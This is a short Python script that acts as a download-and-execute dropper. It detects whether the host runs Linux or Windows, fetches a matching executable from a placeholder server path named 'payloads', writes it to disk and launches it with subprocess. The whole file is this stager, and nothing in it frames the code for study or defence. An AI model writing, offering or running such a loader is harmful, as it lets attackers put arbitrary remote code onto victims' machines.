import subprocess, platform
import requests, os
from pathlib import Path

# Detect OS:
platform_os = platform.system()
# Set Filename:
if platform_os == "Linux":
    filename = "Linux Executable Name" #ELF: Executable and Linkable Format
elif platform_os == "Windows":
    filename = "Windows Exe Name.exe" #EXE: Executable

if True:
    # Download:
    data = requests.get("http://your-server.com/payloads/{0}".format(filename))
    # Save
    with open(filename, "wb") as fl:
        fl.write(data.content)
        
# Run:
try:
    subprocess.Popen(args="", executable=filename)
except Exception as error:
    print(error)
